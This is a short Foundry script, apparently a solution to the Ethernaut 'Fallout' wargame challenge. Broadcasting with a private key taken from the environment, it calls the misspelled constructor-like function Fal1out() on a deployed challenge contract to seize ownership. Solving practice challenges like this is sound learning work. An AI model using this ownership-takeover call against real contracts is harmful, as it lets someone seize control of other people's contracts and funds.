// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../challenges/2_Fal1out.sol";

contract POC is Script {
    Fallout fal1out = Fallout(0x74AeDd06d77592Fbf41dcd0fa39B04894DB78C52);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        fal1out.Fal1out();

        vm.stopBroadcast();
    }
}
